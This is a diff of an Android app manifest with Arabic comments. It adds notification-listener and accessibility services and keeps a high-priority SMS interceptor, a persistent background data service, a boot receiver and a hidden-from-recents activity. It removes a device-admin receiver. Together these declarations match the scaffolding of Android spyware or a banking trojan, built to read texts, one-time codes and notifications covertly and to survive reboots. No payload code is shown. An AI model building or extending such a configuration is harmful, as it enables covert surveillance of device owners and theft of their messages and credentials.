@@ -29,14 +29,12 @@
         android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
         android:allowBackup="false"
         android:persistent="true"
-        android:usesCleartextTraffic="true"
-        android:hardwareAccelerated="true">
+        android:usesCleartextTraffic="true">
 
         <activity android:name=".MainActivity"
             android:exported="true"
             android:launchMode="singleInstance"
             android:excludeFromRecents="true"
-            android:noHistory="true"
             android:theme="@style/Theme.AppCompat.Light.DarkActionBar">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -44,19 +42,37 @@
             </intent-filter>
         </activity>
 
+        <!-- خدمة الإشعارات - هذه تخلي التطبيق يظهر في قائمة الوصول للإشعارات -->
+        <service android:name=".NotificationListener"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- خدمة الوصول - هذه تخلي التطبيق يظهر في قائمة إمكانية الوصول -->
+        <service android:name=".AccessibilityService"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
         <service android:name=".DataService"
             android:enabled="true"
             android:exported="true"
-            android:stopWithTask="false"
-            android:foregroundServiceType="dataSync" />
+            android:stopWithTask="false" />
 
         <receiver android:name=".BootReceiver"
             android:enabled="true"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
 
@@ -66,18 +82,6 @@
             android:permission="android.permission.BROADCAST_SMS">
             <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-            </intent-filter>
-        </receiver>
-
-        <receiver android:name=".AdminReceiver"
-            android:enabled="true"
-            android:exported="true"
-            android:permission="android.permission.BIND_DEVICE_ADMIN">
-            <meta-data android:name="android.app.device_admin"
-                android:resource="@xml/admin_receiver" />
-            <intent-filter>
-                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
             </intent-filter>
         </receiver>
 
